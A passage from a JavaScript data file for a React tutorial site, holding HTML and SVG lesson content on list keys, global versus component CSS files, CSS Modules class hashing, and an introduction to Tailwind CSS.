                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--danger);">Warning: Child must have unique "key"</text>
                  </g>

                  <!-- With Keys -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="140" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="85" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">WITH KEY={ID} ✓</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">Unique Roll Number Identity</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">&lt;Card key={idx} ... /&gt;</text>
                    <text x="25" y="116" class="svg-mono-xs" style="fill:var(--text);">Unique ID per student: [0, 1, 2, ...]</text>
                    <text x="25" y="136" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">React does surgical in-place updates</text>
                    <text x="25" y="154" class="svg-mono-xs" style="fill:var(--text-muted);">Zero warnings · 60fps silky performance</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "15.3",
          title: "Fixing the Warning With idx (key={idx}) & Practice Ideas",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>How to Fix the Warning Using <code>idx</code>:</strong>
                <ul class="notes-sub-list">
                  <li>The second argument of <code>.map()</code> provides the zero-based index of each item in the array: <code>array.map((elem, idx) =&gt; ...)</code>.</li>
                  <li>Pass <strong><code>key={idx}</code></strong> to the top-level element returned inside the callback:
                    <pre class="notes-code-block"><code>{jobOpenings.map((elem, idx) =&gt; (
  &lt;Card key={idx} {...elem} /&gt;
))}</code></pre>
                  </li>
                  <li><strong>Invisible in the DOM:</strong> Notice that React uses <code>key</code> solely for its internal reconciliation engine. If you inspect the rendered HTML in Chrome DevTools, you will see that <code>key</code> does <strong>not</strong> appear as an attribute on the physical DOM node!</li>
                </ul>
              </li>
              <li><strong>Recommended Production Practice:</strong>
                <ul class="notes-sub-list">
                  <li>While <code>key={idx}</code> eliminates the console warning for static lists, for dynamic lists that support deletion, insertion, or reordering, always prefer a stable unique database ID: <code>key={elem.id}</code>.</li>
                </ul>
              </li>
              <li><strong>Interactive Practice Ideas:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Contact Directory:</strong> Render 20 contacts with avatar, full name, phone number, and an "Active" badge.</li>
                  <li><strong>Freelancer Profile Cards:</strong> Render freelancer profiles showing hourly rate, rating stars, location, and a list of skill chips (<code>React</code>, <code>Tailwind</code>, <code>Node.js</code>).</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 15.2 · Reconciliation Diffing Engine: List Updates With Keys vs. Without Keys</span>
                <span class="diagram-frame-tag">VIRTUAL DOM RECONCILIATION BENCHMARK</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing list insertion at beginning: without keys all elements are destroyed and recreated, with keys only the new element is inserted">
                  <!-- Case A: Without Keys -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--danger)" stroke-width="1.5"/>
                    <text x="200" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">MUTATION WITHOUT KEYS</text>
                    <text x="200" y="50" text-anchor="middle" class="svg-title">Prepending Item to List</text>

                    <!-- Old vs New Nodes -->
                    <rect x="15" y="65" width="170" height="30" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="100" y="85" text-anchor="middle" class="svg-mono-xs">[A, B, C]</text>

                    <text x="200" y="85" text-anchor="middle" class="svg-title" style="fill:var(--danger);">→</text>

                    <rect x="215" y="65" width="165" height="30" rx="4" fill="var(--danger-bg)" stroke="var(--danger)"/>
                    <text x="297" y="85" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">[NEW, A, B, C]</text>

                    <rect x="15" y="105" width="365" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="125" class="svg-mono-xs" style="fill:var(--danger);">Index 0: A vs NEW → Mutates DOM</text>
                    <text x="25" y="143" class="svg-mono-xs" style="fill:var(--danger);">Index 1: B vs A → Mutates DOM</text>
                    <text x="25" y="161" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">Total: 4 Destructive DOM Repaints</text>
                  </g>

                  <!-- Case B: With Keys -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="200" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">SURGICAL RECONCILIATION WITH KEYS</text>
                    <text x="200" y="50" text-anchor="middle" class="svg-title">Key-Guided Minimal Patch</text>

                    <rect x="15" y="65" width="170" height="30" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="100" y="85" text-anchor="middle" class="svg-mono-xs">{key:A}, {key:B}</text>

                    <text x="200" y="85" text-anchor="middle" class="svg-title" style="fill:var(--success);">→</text>

                    <rect x="215" y="65" width="165" height="30" rx="4" fill="var(--success-bg)" stroke="var(--success)"/>
                    <text x="297" y="85" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">{key:NEW}, {key:A}, ...</text>

                    <rect x="15" y="105" width="365" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="125" class="svg-mono-xs" style="fill:var(--success);">Matches key:A & key:B nodes in-place ✓</text>
                    <text x="25" y="143" class="svg-mono-xs" style="fill:var(--success);">Preserves internal DOM node state ✓</text>
                    <text x="25" y="161" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Total: Only 1 surgical prepend operation</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 16: STYLING IN REACT — GLOBAL CSS VS. SEPARATE CSS FILES
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-16-styling-global-vs-separate-css",
      number: "16",
      shortLabel: "Global CSS vs Separate CSS",
      title: "Styling in React — Global CSS vs. Separate CSS Files",
      summary: "Global index.css scalability bottlenecks, component-scoped CSS files in styles/, runtime global stylesheet injection, and the CSS class name clash bug.",
      subtopicLabels: ["16.1 Global CSS & Limitations", "16.2 Separate Component CSS", "16.3 The Class Name Clash Bug"],
      diagramCount: 2,
      sections: [
        {
          num: "16.1",
          title: "Method 1: Global CSS (index.css) & Its Limitations",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Project Architecture Setup (<code>05-css</code>):</strong>
                <ul class="notes-sub-list">
                  <li>In a fresh project setup, reset <code>App.jsx</code> and <code>index.css</code> to start with a clean baseline.</li>
                  <li>In basic React tutorials, all styles are dumped into a single global stylesheet: <code>src/index.css</code> (which is imported into <code>src/main.jsx</code>).</li>
                </ul>
              </li>
              <li><strong>How Global CSS Operates:</strong>
                <ul class="notes-sub-list">
                  <li>Every CSS selector declared inside <code>index.css</code> applies universally to every component rendered anywhere in the DOM.</li>
                </ul>
              </li>
              <li><strong>The Production Scalability Bottleneck:</strong>
                <ul class="notes-sub-list">
                  <li>Writing all CSS in one file is viable only for small demos (like a simple Calculator or To-Do app).</li>
                  <li>In enterprise applications with dozens or hundreds of components, dumping all styles into <code>index.css</code> creates an unmaintainable "hodgepodge"—dead styles accumulate, selector specificity wars break layouts, and refactoring becomes dangerous.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "16.2",
          title: "Method 2: Separate Component CSS Files (styles/ Folder)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Splitting CSS into Component-Dedicated Files:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Step 1:</strong> Create your components inside <code>src/components/</code> (e.g. <code>Button.jsx</code> and <code>Header.jsx</code> using the <code>rafce</code> shortcut).</li>
                  <li><strong>Step 2:</strong> Create a dedicated <code>src/styles/</code> directory containing matching CSS files:
                    <ul class="notes-sub-list">
                      <li><code>Button.css</code> → Declares button styling (e.g. <code>.btn { padding: 10px 20px; border-radius: 8px; }</code>).</li>
                      <li><code>Header.css</code> → Declares header layout rules (e.g. <code>.header { display: flex; align-items: center; justify-content: space-between; padding: 10px 20px; margin: 5px; }</code>).</li>
                    </ul>
                  </li>
                  <li><strong>Step 3:</strong> Keep <code>index.css</code> strictly for universal resets (box-sizing, body font-family).</li>
                  <li><strong>Step 4:</strong> Import each stylesheet directly inside its respective component:
                    <pre class="notes-code-block"><code>// src/components/Button.jsx
import '../styles/Button.css';

// src/components/Header.jsx
import '../styles/Header.css';</code></pre>
                  </li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 16.1 · React Styling Architecture: Monolithic Global CSS vs. Component-Linked Files</span>
                <span class="diagram-frame-tag">CODEBASE ORGANIZATION PATTERNS</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram contrasting monolithic global CSS with component-linked CSS files">
                  <!-- Global Monolith -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="182" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="106" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">MONOLITHIC GLOBAL CSS</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Single Massive index.css</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--danger);">src/index.css (2,000+ Lines)</text>
                    <text x="35" y="116" class="svg-mono-xs" style="fill:var(--text-muted);">/* Mixed Button, Nav, Modal styles */</text>
                    <text x="35" y="134" class="svg-mono-xs" style="fill:var(--danger);">Zero encapsulation · High regression risk</text>
                    <text x="35" y="152" class="svg-mono-xs" style="fill:var(--text-muted);">Dead CSS accumulates indefinitely</text>
                  </g>

                  <!-- Separate Files -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="174" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="102" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">COMPONENT-LINKED CSS</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Split Styles Directory</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--primary);">src/styles/</text>
                    <text x="35" y="116" class="svg-mono-xs" style="fill:var(--text);">├── Button.css ↔ Button.jsx</text>
                    <text x="35" y="134" class="svg-mono-xs" style="fill:var(--text);">└── Header.css ↔ Header.jsx</text>
                    <text x="35" y="152" class="svg-mono-xs" style="fill:var(--accent);">Clean on disk · But lacks runtime scoping!</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "16.3",
          title: "The Class Name Clash Problem (Why Plain Separate CSS Fails at Scale)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>What Actually Happens in the Browser at Runtime:</strong>
                <ul class="notes-sub-list">
                  <li>When you write <code>import '../styles/Button.css'</code> and <code>import '../styles/Header.css'</code>, Vite bundles both files together and injects their raw CSS text into the <strong>same global <code>&lt;head&gt;</code> stylesheet</strong>.</li>
                  <li><strong>Plain CSS imports have ZERO lexical scoping in JavaScript!</strong></li>
                </ul>
              </li>
              <li><strong>The Style Leakage Bug:</strong>
                <ul class="notes-sub-list">
                  <li>Suppose <code>Button.css</code> defines a solid rounded action button:
                    <pre class="notes-code-block"><code>/* Button.css */
.btn {
  background-color: royalblue;
  color: white;
  padding: 12px 24px;
  border-radius: 8px;
}</code></pre>
                  </li>
                  <li>Inside <code>Header.jsx</code>, you also use <code>className="btn"</code> for a simple, minimalist login link in the navbar.</li>
                  <li><strong>The Critical Failure:</strong> The styles from <code>Button.css</code> bleed directly into <code>Header.jsx</code>, unintentionally overwriting the header link with heavy blue padding!</li>
                </ul>
              </li>
              <li><strong>Staff Engineer Key Takeaway:</strong>
                <ul class="notes-sub-list">
                  <li>Physical file separation on your hard drive organizes files in VS Code, but does <strong>not</strong> isolate styles in the browser. That is why plain separate CSS files are an anti-pattern for large-scale React applications.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 16.2 · The Global Scope CSS Leak: How Plain CSS Imports Collide at Runtime</span>
                <span class="diagram-frame-tag">RUNTIME SCOPING PITFALL</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing Button.css and Header.css both defining .btn colliding in the global DOM stylesheet">
                  <!-- Button.css -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="230" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="115" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">SOURCE FILE 1</text>
                    <text x="115" y="52" text-anchor="middle" class="svg-title">Button.css</text>
                    <rect x="15" y="66" width="200" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="90" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">.btn {</text>
                    <text x="35" y="110" class="svg-mono-xs">background: royalblue;</text>
                    <text x="35" y="128" class="svg-mono-xs">padding: 12px 24px;</text>
                    <text x="25" y="148" class="svg-mono-xs">}</text>
                  </g>

                  <!-- Header.css -->
                  <g transform="translate(285, 25)">
                    <rect x="0" y="0" width="230" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="115" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">SOURCE FILE 2</text>
                    <text x="115" y="52" text-anchor="middle" class="svg-title">Header.css</text>
                    <rect x="15" y="66" width="200" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="90" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">.btn {</text>
                    <text x="35" y="110" class="svg-mono-xs">background: transparent;</text>
                    <text x="35" y="128" class="svg-mono-xs">padding: 4px 8px;</text>
                    <text x="25" y="148" class="svg-mono-xs">}</text>
                  </g>

                  <!-- Bundling Arrow -->
                  <g transform="translate(525, 100)">
                    <line x1="0" y1="10" x2="45" y2="10" stroke="var(--danger)" stroke-width="2.5"/>
                    <polygon points="45,5 55,10 45,15" fill="var(--danger)"/>
                    <text x="22" y="-2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--danger);">Vite Bundle</text>
                  </g>

                  <!-- Global DOM Collision -->
                  <g transform="translate(595, 25)">
                    <rect x="0" y="0" width="260" height="175" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="2"/>
                    <text x="130" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">GLOBAL DOM &lt;HEAD&gt;</text>
                    <text x="130" y="52" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Naming Collision 💥</text>

                    <rect x="15" y="66" width="230" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="88" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">Both .btn rules collide!</text>
                    <text x="25" y="108" class="svg-mono-xs" style="fill:var(--text-muted);">Last imported rule overrides first.</text>
                    <text x="25" y="128" class="svg-mono-xs" style="fill:var(--danger);">Navbar link turns blue & heavy!</text>
                    <text x="25" y="146" class="svg-mono-xs" style="fill:var(--text-muted);">Zero style isolation.</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 17: MODULE CSS (.MODULE.CSS) — SCOPED COMPONENT STYLING
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-17-module-css-scoped-styling",
      number: "17",
      shortLabel: "Module CSS & Scoped Styles",
      title: "Module CSS (.module.css) — Scoped Component Styling",
      summary: "Component co-location architecture, .module.css naming convention, importing styles objects, hashed class names, and eliminating CSS collisions.",
      subtopicLabels: ["17.1 Co-location & Naming", "17.2 Importing & Applying styles", "17.3 How Modules Stop Collisions"],
      diagramCount: 2,
      sections: [
        {
          num: "17.1",
          title: "Component-Based Folder Structure & Naming Convention",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>What Is Module CSS?</strong>
                <ul class="notes-sub-list">
                  <li><strong>Module CSS</strong> is a built-in bundler mechanism (supported natively by Vite, Webpack, and Next.js) that scopes CSS class names strictly to the component that imports them.</li>
                </ul>
              </li>
              <li><strong>The Co-location Folder Structure Pattern:</strong>
                <ul class="notes-sub-list">
                  <li>Instead of a distant, separated <code>src/styles/</code> directory, senior engineers co-locate the component's JavaScript and stylesheet in their own dedicated component directory:
                    <pre class="notes-code-block"><code>src/
└── components/
    ├── button/
    │   ├── Button.jsx
    │   └── Button.module.css
    └── header/
        ├── Header.jsx
        └── Header.module.css</code></pre>
                  </li>
                  <li><strong>The Strict Naming Rule:</strong> Module stylesheets <strong>MUST</strong> use the <strong><code>.module.css</code></strong> file extension (e.g. <code>Button.module.css</code>). Vite relies specifically on this extension to trigger its automated class-hashing transform.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "17.2",
          title: "Importing & Applying Module CSS (className={styles.className})",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Step 1 · Import as a JavaScript Object:</strong>
                <ul class="notes-sub-list">
                  <li>Import the CSS module as a named JavaScript object (conventionally named <code>styles</code>):
                    <pre class="notes-code-block"><code>// src/components/button/Button.jsx
import styles from './Button.module.css';

// src/components/header/Header.jsx
import styles from './Header.module.css';</code></pre>
                  </li>
                </ul>
              </li>
              <li><strong>Step 2 · Apply via <code>className</code> (Not <code>style</code>):</strong>
                <ul class="notes-sub-list">
                  <li>Bind the hashed class property using JSX dot notation:
                    <pre class="notes-code-block"><code>// In Button.jsx
const Button = () => {
  return &lt;button className={styles.btn}&gt;Click Me&lt;/button&gt;;
};

// In Header.jsx
const Header = () => {
  return &lt;header className={styles.header}&gt;Header UI&lt;/header&gt;;
};</code></pre>
                  </li>
                  <li><strong>Common Beginner Pitfall:</strong> Never write <code>style={styles.btn}</code>! The HTML <code>style</code> prop expects an inline JavaScript style object (e.g. <code>{ color: 'red' }</code>), whereas <code>styles.btn</code> is a string containing the compiled class name. Always use <code>className={styles.btn}</code>.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 17.1 · CSS Module Compilation & Class Name Hashing Pipeline</span>
                <span class="diagram-frame-tag">POSTCSS COMPILATION & HASH GENERATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing Button.module.css .btn getting transformed into a unique hash _btn_1a4f9_12 by Vite">
                  <!-- Author Code -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="240" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="120" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">1 · AUTHOR CSS</text>
                    <text x="120" y="52" text-anchor="middle" class="svg-title">Button.module.css</text>
                    <rect x="15" y="66" width="210" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="90" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">.btn {</text>
                    <text x="35" y="110" class="svg-mono-xs">background: royalblue;</text>
                    <text x="35" y="128" class="svg-mono-xs">padding: 10px 20px;</text>
                    <text x="25" y="148" class="svg-mono-xs">}</text>
                  </g>

                  <!-- Compiler Arrow -->
                  <g transform="translate(275, 105)">
                    <line x1="0" y1="10" x2="45" y2="10" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="45,6 53,10 45,14" fill="var(--primary)"/>
                    <text x="22" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--primary);">Vite Transform</text>
                  </g>

                  <!-- Hashed Styles Object -->
                  <g transform="translate(340, 25)">
                    <rect x="0" y="0" width="250" height="175" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="125" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">2 · JS STYLES OBJECT</text>
                    <text x="125" y="52" text-anchor="middle" class="svg-title">Hashed Key-Value Map</text>
                    <rect x="15" y="66" width="220" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="90" class="svg-mono-xs">styles = {</text>
                    <text x="35" y="114" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">btn: "_btn_a91b_1"</text>
                    <text x="25" y="136" class="svg-mono-xs">}</text>
                    <text x="25" y="152" class="svg-sub">Unique deterministic hash</text>
                  </g>

                  <!-- DOM Injection Arrow -->
                  <g transform="translate(600, 105)">
                    <line x1="0" y1="10" x2="45" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="45,6 53,10 45,14" fill="var(--success)"/>
                    <text x="22" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--success);">Injects</text>
                  </g>

                  <!-- Final Rendered DOM -->
                  <g transform="translate(655, 25)">
                    <rect x="0" y="0" width="200" height="175" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="100" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">3 · BROWSER DOM</text>
                    <text x="100" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Scoped Node</text>
                    <rect x="15" y="66" width="170" height="95" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--text);">&lt;button</text>
                    <text x="30" y="118" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">class="_btn_a91b_1"</text>
                    <text x="25" y="138" class="svg-mono-xs">&gt;Click&lt;/button&gt;</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "17.3",
          title: "How Module CSS Eliminates Class Collisions",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Collision Immunity via Lexical Scoping:</strong>
                <ul class="notes-sub-list">
                  <li>Even if ten different components declare a class called <code>.btn</code>:
                    <ul class="notes-sub-list">
                      <li><code>Button.module.css</code> compiles to: <code>._btn_button_8x1</code></li>
                      <li><code>Header.module.css</code> compiles to: <code>._btn_header_9q2</code></li>
                      <li><code>Modal.module.css</code> compiles to: <code>._btn_modal_4f7</code></li>
                    </ul>
                  </li>
                  <li>When <code>Header.jsx</code> binds <code>className={styles.btn}</code>, it is impossible for styles from <code>Button.module.css</code> to leak in because the DOM element receives the unique hash <code>_btn_header_9q2</code>.</li>
                </ul>
              </li>
              <li><strong>Industry Perspective (Why Teams Transition to Tailwind CSS):</strong>
                <ul class="notes-sub-list">
                  <li>While CSS Modules completely solve collision problems, developers still experience <strong>context-switching fatigue</strong> (jumping between <code>.jsx</code> and <code>.module.css</code>) and <strong>naming fatigue</strong> (thinking up names for every single wrapper and container).</li>
                  <li>Modern production React teams largely prefer <strong>Tailwind CSS</strong> (utility-first) or component primitives for higher developer velocity and design-system consistency.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 17.2 · CSS Collision Immunity: Isolated Hashed Identifiers Across Components</span>
                <span class="diagram-frame-tag">LEXICAL SCOPING & ENCAPSULATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing Button and Header using identical .btn class name compiling to two distinct unique hashes without collision">
                  <!-- Button Component Scope -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="170" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="100" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">BUTTON SCOPE</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Button.module.css (.btn)</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--primary)"/>
                    <text x="25" y="96" class="svg-mono-xs">Rule: .btn { background: royalblue; }</text>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">Hash: ._btn_btnScope_a1</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--success);">✓ Scoped strictly to &lt;Button /&gt;</text>
                    <text x="25" y="154" class="svg-sub">Cannot affect any other component in tree</text>
                  </g>

                  <!-- Header Component Scope -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="170" height="22" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2"/>
                    <text x="100" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">HEADER SCOPE</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Header.module.css (.btn)</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="96" class="svg-mono-xs">Rule: .btn { background: transparent; }</text>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">Hash: ._btn_hdrScope_x9</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--success);">✓ Scoped strictly to &lt;Header /&gt;</text>
                    <text x="25" y="154" class="svg-sub">Zero namespace pollution · 100% scoped</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 18: WHAT IS TAILWIND CSS? (UTILITY-FIRST VS. BOOTSTRAP)
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-18-what-is-tailwind-css",
      number: "18",
      shortLabel: "Tailwind CSS Fundamentals",
      title: "What Is Tailwind CSS? (Utility-First Library vs. Bootstrap)",
      summary: "Utility-first design paradigm, utility classes vs component libraries, the Bootstrap comparison, and Tailwind v3 vs v4 architecture differences.",
      subtopicLabels: ["18.1 Utility-First Concept", "18.2 Tailwind vs Bootstrap", "18.3 Tailwind v4 Engine"],
      diagramCount: 2,
      sections: [
        {
          num: "18.1",
          title: "Utility-First Library vs. Component Library",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>What Is Tailwind CSS?</strong>
                <ul class="notes-sub-list">
                  <li><strong>Tailwind CSS</strong> is a <strong>Utility-First CSS framework</strong>. Rather than providing pre-packaged UI widgets, it provides thousands of single-responsibility, low-level utility classes directly inside your JSX:
                    <pre class="notes-code-block"><code>&lt;div className="h-screen w-full bg-gray-900 flex items-center justify-center"&gt;
  &lt;h1 className="text-3xl font-bold text-white tracking-wide"&gt;OneNightRevise&lt;/h1&gt;
&lt;/div&gt;</code></pre>
                  </li>
                </ul>
              </li>
              <li><strong>Utility-First Library vs. Component Library:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Utility-First Library (Tailwind CSS):</strong> Provides primitive styling classes (<code>p-4</code>, <code>bg-red-600</code>, <code>rounded-xl</code>). You retain complete freedom to architect bespoke designs rapidly without ever writing a custom CSS file or inventing class names like <code>.card-container-wrapper</code>.</li>
                  <li><strong>Component Library (MUI, Bootstrap, Chakra):</strong> Ships pre-built, opinions-included components (like a complete <code>&lt;Button /&gt;</code>, <code>&lt;Modal /&gt;</code>, or <code>&lt;Navbar /&gt;</code>). Customizing them often requires fighting high-specificity overrides. <strong>Tailwind CSS is NOT a component library.</strong></li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "18.2",
          title: "Why Tailwind Over Bootstrap",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Paradigm Shift (Moving Beyond Bootstrap):</strong>
                <ul class="notes-sub-list">
                  <li>Bootstrap was built in 2011 for an earlier generation of the web. Sites built with default Bootstrap classes look rigid, identical, and unmistakably dated.</li>
                  <li>Overriding Bootstrap components requires aggressive specificity hacks and <code>!important</code> tags.</li>
                  <li><strong>Tailwind CSS</strong> has become the modern industry standard for React frontends because it allows engineering teams to construct pixel-perfect, custom design systems directly inside component markup with zero dead CSS in production.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 18.1 · Frontend Styling Evolution: Traditional CSS vs. Bootstrap vs. Tailwind CSS</span>
                <span class="diagram-frame-tag">PARADIGM EVOLUTION & DEVELOPER VELOCITY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing evolution from Vanilla CSS to Bootstrap to Tailwind utility-first CSS">
